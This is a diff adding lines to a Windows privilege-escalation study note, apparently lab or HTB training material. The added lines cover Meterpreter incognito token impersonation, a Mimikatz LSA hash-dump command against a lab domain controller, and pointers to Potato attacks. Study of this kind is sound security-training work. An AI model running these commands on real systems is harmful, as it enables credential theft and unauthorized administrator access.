@@ -104,6 +104,26 @@
 - HTB to practice "SecNotes"
 
 ## Impersonation and Potato Attacks
+**Token Impersonation with Incognito**
+- View if the user has a privilege to impersonate token
+	- `whoami /priv`
+- We can load incognito from meterpreter shell.
+  - `load incognito`
+  - `help` - It will show incognito command
+  - `list_tokens -u` : List the tokens, we can impersonate the listed users.
+  - `impersonate_token marvel\\administrator`
+  - `shell`
+  - `whoami`
+- Attempt to dump hashes as Domain Admin
+	- `Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /patch" exit' -Computer HYDRA.marvel.local`
+	- `# privilege::debug`
+	- `# LSADump::LSA /patch`
+
+**Potato Attacks**
+- This attack can be possible when you have `SeImpersonnate` or `SeAssignPrimaryToken` privileges. See via `whoami /priv`
+- More about Rotten Potato: https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
+- More about Juicy Potato: https://github.com/ohpe/juicy-potato
+- HTB to practice: Jeeves
 
 ## Escalation Path: getsystem
 
